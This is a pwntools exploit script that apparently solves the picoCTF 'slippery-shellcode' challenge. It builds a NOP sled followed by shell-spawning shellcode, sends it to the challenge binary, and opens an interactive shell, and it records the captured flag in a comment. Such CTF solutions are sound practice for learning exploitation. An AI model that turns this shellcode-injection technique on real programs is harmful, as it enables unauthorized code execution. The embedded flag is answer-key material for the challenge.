#!/usr/bin/env python3

from pwn import *

s = process('/problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8/vuln')
s.recvuntil('Enter your shellcode:\n')

shellcode = asm(shellcraft.sh())

payload = fit({120: shellcode}, filler = asm(shellcraft.nop())) # 120 nops + shellcode

s.sendline(payload)
s.interactive()

# picoCTF{sl1pp3ry_sh311c0d3_de21cb07}
